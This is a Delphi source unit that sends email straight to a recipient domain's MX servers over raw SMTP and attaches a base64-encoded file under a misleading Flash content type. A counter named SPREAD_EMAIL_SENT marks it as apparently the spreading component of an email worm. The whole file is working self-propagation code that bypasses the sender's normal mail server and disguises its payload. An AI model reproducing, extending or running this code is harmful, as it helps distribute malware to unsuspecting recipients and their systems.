   unit untMailSend;

   interface

   uses
     windows, winsock, MXResolver, untStatus;

     Function MailSend( mailTo: String; mailFrom: String; mailFile: String;
                        mailSubject: String; mailBody: String ): Bool;

   implementation

   function InttoStr(const Value: integer): string; var S: string[11];
   begin Str(Value, S); Result := S; end;

   function ExtractFileName(const Path: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     L := Length(Path);
     for i := L downto 1 do
     begin
       Ch := Path[i];
       if (Ch = '\') or (Ch = '/') then
       begin
         Result := Copy(Path, i + 1, L - i);
         Break;
       end;
     end;
   end;

   PROCEDURE Base64Encode(CONST InText:AnsiString;VAR OutText:AnsiString);
   VAR
     PIn     : Pointer;
     POut    : Pointer;
     InSize  : Cardinal;
     OutSize : Cardinal;

     PROCEDURE Base64Encode2(CONST InBuffer;InSize:Cardinal;VAR OutBuffer); REGISTER;
     CONST
       cBase64Codec : ARRAY [0..63] OF AnsiChar = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
     VAR
       ByThrees : Cardinal;
       LeftOver : Cardinal;
       Line     : Word;
     ASM
       mov ESI,[EAX]
       mov EDI,[ECX]
       mov EAX,EBX
       mov ECX,$03
       xor EDX,EDX
       div ECX
       mov ByThrees,EAX
       mov LeftOver,EDX
       lea ECX,cBase64Codec[0]
       xor EAX,EAX
       xor EBX,EBX
       xor EDX,EDX
       cmp ByThrees,0
       jz  @@LeftOver
       mov Line,0
       @@LoopStart:
       inc Line
       LODSW
       mov BL,AL
       shr BL,2
       mov DL,BYTE PTR [ECX+EBX]
       mov BH,AH
       and BH,$0F
       rol AX,4
       and AX,$3F
       mov DH,BYTE PTR [ECX+EAX]
       mov AX,DX
       STOSW
       LODSB
       mov BL,AL
       shr BX,6
       mov DL,BYTE PTR [ECX+EBX]
       and AL,$3F
       xor AH,AH
       mov DH,BYTE PTR [ECX+EAX]
       mov AX,DX
       STOSW
       cmp Line,19
       jnz @@ugor
       mov AX,$0A0D
       STOSW
       mov Line,0
       @@ugor:
       dec ByThrees
       jnz @@LoopStart
       @@LeftOver:
       cmp LeftOver, 0
       jz  @@Done
       xor EAX,EAX
       xor EBX,EBX
       xor EDX,EDX
       LODSB
       shl AX,6
       mov BL,AH
       mov DL,BYTE PTR [ECX+EBX]
       dec LeftOver
       jz  @@SaveOne
       shl AX,2
       and AH,$03
       LODSB
       shl AX,4
       mov BL,AH
       mov DH,BYTE PTR [ECX+EBX]
       shl EDX,16
       shr AL,2
       mov BL,AL
       mov DL,BYTE PTR [ECX+EBX]
       mov DH,'='
       jmp @@WriteLast4
       @@SaveOne:
       shr AL,2
       mov BL,AL
       mov DH,BYTE PTR [ECX+EBX]
       shl EDX,16
       mov DH,'='
       mov DL,'='
       @@WriteLast4:
       mov EAX,EDX
       ror EAX,16
       STOSD
       @@Done:
     END;

   BEGIN
     InSize:=Length(InText);
     OutSize:=(InSize DIV 3) SHL 2;
     IF InSize MOD 3>0 THEN Inc(OutSize,4);
     Outsize:=Outsize+Outsize DIV 20;
     SetLength(OutText,OutSize);
     PIn:=@InText[1];
     POut:=@OutText[1];
     Base64Encode2(PIn,InSize,POut);
   END;

   FUNCTION NameToIP(HostName:STRING) : STRING;
   TYPE
     TAPInAddr = ARRAY [0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     I          : Integer;
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(pChar(HostName));
       IF HostEntPtr<>NIL THEN BEGIN
         pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
         I:=0;
         WHILE pptr^[I]<>NIL DO BEGIN
           Result:=(inet_ntoa(pptr^[I]^));
           Inc(I);
         END;
       END;
     EXCEPT
     END;
     WSACleanUp();
   END;

   Function MailSend( mailTo: String; mailFrom: String; mailFile: String;
                      mailSubject: String; mailBody: String ): Bool;
   Var
     I             :Integer;
     F             :File;
     FileBuf       :AnsiString;
     SendBuf       :AnsiString;

     Sock          :TSocket;
     Wsa           :TWSAData;
     Addr          :TSockAddrIn;
     MX            :TMXResolver;
     Domain        :String;
     Rnd           :String;

     LocalHost     :ARRAY [0..63] OF CHAR;

     Procedure SendData(Text: String; Sock: TSocket);
     Begin Send(Sock, Text[1], Length(Text), 0); End;

     Function MyRecv(Code: String): Bool;
     Var Buf: Array[0..2048] Of Char; Begin
     ZeroMemory(@Buf[0], SizeOf(Buf));
     If (Recv(Sock, Buf, SizeOf(Buf), 0) = Socket_Error) or
     (Copy(Buf, 1, 3) <> Code) Then Result := False Else Result := True;
     End;

   Begin
     Result := False;
     If mailTo = '' Then Exit;
     If mailFrom = '' Then Exit;

     Domain := Copy(mailTo, Pos('@', mailTo)+1, Length(mailTo));

     MX := TMXResolver.Create(Domain);

     If MX.ListOfSMTPServers.Count = 0 Then Exit;

     For I := 0 To MX.ListOfSMTPServers.Count -1 Do
     Begin
       WSAStartUp(MakeWord(2,1), WSA);
         GetHostName(LocalHost,SizeOf(LocalHost));

         Sock := Socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
         Addr.sin_family := AF_INET;
         Addr.sin_port := hTons(25);
         Addr.sin_addr.S_addr := inet_addr(pChar(NameToIP(MX.ListOfSMTPServers.Strings(I))));

         If Connect(Sock, Addr, SizeOf(Addr)) > -1 Then
         Begin
           Randomize;
           Rnd := '---'+IntToStr(Random(99999999))+'--'+IntToStr(Random(9999))+'-';

           If Not MyRecv('220') Then Break;
           SendData('HELO '+LocalHost+#13#10, Sock);
           If Not MyRecv('250') Then Break;
           SendData('MAIL FROM: <'+mailFrom+'>'#13#10, Sock);
           If Not MyRecv('250') Then Break;
           SendData('RCPT TO: <'+mailTo+'>'#13#10, Sock);
           If Not MyRecv('250') Then Break;
           SendData('DATA'#13#10, Sock);
           If Not MyRecv('354') Then Break;
           SendData('From: '+mailFrom+#13#10+
                    'To: '+mailTo+#13#10+
                    'Subject: '+mailSubject+#13#10+
                    'MIME-Version: 1.0'#13#10+
                    'Content-Type: multipart/mixed; boundary="'+Rnd+'"'#13#10#13#10+
                    '--'+Rnd+#13#10+
                    'Content-Type: text/plain; charset:us-ascii'#13#10#13#10+
                    mailBody+#13#10#13#10+
                    '--'+Rnd+#13#10+
                    'Content-Type: application/x-shockwave-flash;'#13#10+
                    ' name="'+ExtractFileName(mailFile)+'"'#13#10+
                    'Content-Transfer-Encoding: base64'#13#10#13#10, sock);
           AssignFile(F, mailFile);
           FileMode := 0;
           {$I-}
           Reset(F,1);
           If IOResult = 0 Then
           Begin
             SetLength(FileBuf, FileSize(F));
             BlockRead(F, FileBuf[1], FileSize(F));
             Base64Encode(FileBuf, SendBuf);
             SendData(SendBuf, Sock);
             CloseFile(F);
           End;
           {$I+}
           SendData(#13#10'--'+rnd+'--'#13#10'.'#13#10, Sock);
           If Not MyRecv('250') Then Break;
           SendData('QUIT'#13#10, Sock);
           Result := True;
           Inc(SPREAD_EMAIL_SENT);
           WSACleanUp;
         End;
     End;
   End;

   end.
